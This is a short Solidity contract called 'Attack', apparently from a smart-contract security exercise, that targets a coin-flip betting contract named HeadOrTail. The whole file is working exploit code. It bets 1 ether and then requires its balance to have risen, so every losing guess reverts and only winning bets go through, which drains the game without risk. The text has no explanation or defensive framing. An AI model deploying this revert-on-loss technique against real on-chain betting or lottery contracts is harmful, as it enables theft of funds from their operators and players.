contract Attack{

    HeadOrTail public headOrTail;

    constructor(HeadOrTail _headOrTail) {
        headOrTail = HeadOrTail(_headOrTail);
    }

    fallback() external payable{}

    function attack(bool choose) public payable {
        uint balance = address(this).balance - 1 ether;
        headOrTail.guess{value: 1 ether}(choose);
        require(address(this).balance > balance);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}